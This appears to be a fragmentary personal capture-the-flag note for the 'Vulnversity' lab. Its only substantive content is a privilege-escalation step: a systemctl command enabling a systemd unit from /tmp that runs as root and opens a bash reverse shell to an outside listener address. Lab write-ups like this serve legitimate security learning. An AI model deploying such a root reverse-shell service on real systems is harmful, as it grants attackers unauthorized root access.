2025-06-21 16:14

Status: #CTF 

Tags:

# Vulnversity

# Reconnaissance





systemctl enable /tmp/root.service

- ``ext.txt``
```bash
[Unit]
Description=root
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.23.129.129/4444 0>&1'
[Install]
WantedBy=multi-user.target
 
```



### References
